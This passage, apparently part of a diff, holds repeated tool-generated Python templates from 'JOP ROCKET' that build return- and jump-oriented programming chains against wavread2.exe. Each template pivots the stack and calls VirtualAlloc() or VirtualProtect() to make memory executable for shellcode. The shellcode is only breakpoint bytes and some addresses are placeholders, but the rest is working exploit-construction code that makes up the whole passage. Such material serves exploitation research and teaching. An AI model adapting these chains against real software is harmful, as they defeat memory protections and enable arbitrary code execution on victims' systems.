+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x70
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x80 **^ 
+		# N----> STACK PIVOT TOTAL: 0x80 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #5
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x10
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x20
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x40
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x50
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x70
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes] 0x88
+		# N----> STACK PIVOT TOTAL: 0x88 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualAlloc
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()
+
+vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
+vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
+vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
+vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
+vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
+vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
+#This is one possible VirtualAlloc() chain; other possibilities exist!
+
+shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET.
+
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #1
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes] 0x78
+		# N----> STACK PIVOT TOTAL: 0x78 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualProtect
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0x00427008) # ptr -> VirtualProtect()
+vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
+vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
+vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location
+
+shellcode = '\xcc\xcc\xcc\xcc'
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #2
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016fe, # (base + 0x16fe), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016ba, # (base + 0x16ba), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x70
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016ba, # (base + 0x16ba), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x80 **^ 
+		# N----> STACK PIVOT TOTAL: 0x80 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualProtect
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0x00427008) # ptr -> VirtualProtect()
+vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
+vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
+vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location
+
+shellcode = '\xcc\xcc\xcc\xcc'
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #3
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes] 0x78
+		# N----> STACK PIVOT TOTAL: 0x78 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualProtect
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0x00427008) # ptr -> VirtualProtect()
+vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
+vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
+vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location
+
+shellcode = '\xcc\xcc\xcc\xcc'
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #4
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x18
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x48
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016ba, # (base + 0x16ba), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x70
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016ba, # (base + 0x16ba), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes] 0x80 **^ 
+		# N----> STACK PIVOT TOTAL: 0x80 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualProtect
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0x00427008) # ptr -> VirtualProtect()
+vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
+vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
+vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location
+
+shellcode = '\xcc\xcc\xcc\xcc'
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET
+
+
+* * * * * * * * * * * * * * * * * * * * * * * * * * * *
+# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #5
+
+
+import struct
+
+def create_rop_chain():
+	rop_gadgets = [
+		0x0042511e, # (base + 0x2511e), # pop edx # ret  # wavread2.exe   Load EDX with address for dispatcher gadget!
+		0x00401677, # (base + 0x1677) # add ebx, 0x10 # jmp dword ptr [ebx] # wavread2.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 12 bytes between dispatch table slots!
+		0x00426de6, # (base + 0x26de6), # pop ebx # ret  # wavread2.exe Load EBX with address of dispatch table
+		0xdeadbeef, # Address for your dispatcher table!
+		 # JMP to dispatcher gadget; start the JOP!
+	]
+	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+
+
+def create_jop_chain():
+	jop_gadgets = [
+	
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x10
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x20
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x30
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x40
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x50
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x60
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016f9, # (base + 0x16f9), # add esp, 0x10 # jmp edx # wavread2.exe  [0x10 bytes]** 0x70
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x004016dd, # (base + 0x16dd), # add esp, 0x18 # jmp edx # wavread2.exe  [0x18 bytes] 0x88
+		# N----> STACK PIVOT TOTAL: 0x88 bytes
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x00401546, # (base + 0x1546), # pop eax # jmp edx # wavread2.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
+		0x42424242, 0x42424242, 0x42424242, 	# padding  (0xc bytes)
+		0x0041d6ca, # (base + 0x1d6ca), # jmp dword ptr [eax] # wavread2.exe # JMP to ptr for VirtualProtect
+		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
+	]
+	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)
+
+rop_chain=create_rop_chain()
+jop_chain=create_jop_chain()
+
+vp_stack = struct.pack('<L', 0x00427008) # ptr -> VirtualProtect()
+vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
+vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
+vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
+vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
+vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location
+
+shellcode = '\xcc\xcc\xcc\xcc'
+nops = '\x90' * 1
+padding = '\x41' * 1
+
+payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly
+
+# This was created by the JOP ROCKET
+
+
